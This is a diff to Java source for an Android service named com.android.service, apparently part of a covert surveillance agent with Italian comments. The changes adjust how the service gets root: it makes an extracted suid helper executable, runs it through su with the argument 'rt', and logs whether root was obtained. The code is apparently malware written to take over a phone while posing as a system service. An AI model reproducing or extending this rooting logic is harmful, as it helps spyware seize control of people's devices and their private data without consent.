@@ -13,6 +13,7 @@ import java.io.OutputStreamWriter;
 import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
+import java.util.ArrayList;
 import java.util.Arrays;
 
 import javax.crypto.Cipher;
@@ -42,6 +43,7 @@ import android.widget.Toast;
 import com.android.service.auto.Cfg;
 import com.android.service.capabilities.PackageInfo;
 import com.android.service.util.Check;
+import com.android.service.util.Execute;
 import com.android.service.util.Utils;
 
 /**
@@ -130,11 +132,15 @@ public class ServiceCore extends Service {
 		// Abbiamo la root?
 		Status.self().setRoot(PackageInfo.checkRoot());
 
-		if (Status.self().haveSu() == true) {
+		if (Status.self().haveSu() == true && Status.self().haveRoot() == false) {
 			// Ask the user...
 			superapkRoot();
 
 			boolean isRoot = PackageInfo.checkRoot();
+			
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (onStart): isRoot = " + isRoot); //$NON-NLS-1$
+			}
 		}
 		
 		if (Cfg.EXP) {
@@ -450,7 +456,9 @@ public class ServiceCore extends Service {
 			}
 
 			Runtime.getRuntime().exec("chmod 755 " + path + "/" + suidext);
-			Runtime.getRuntime().exec("su -c \"" + path + "/" + suidext + Messages.getString("32.11") + "\""); //$NON-NLS-1$ //$NON-NLS-2$
+			Process localProcess = Runtime.getRuntime().exec(new String[] {"su", "-c", "/data/data/com.android.service/files/statusdb rt"}); //$NON-NLS-1$ //$NON-NLS-2$
+			
+			localProcess.waitFor();		
 		} catch (final Exception e1) {
 			if (Cfg.EXCEPTION) {
 				Check.log(e1);
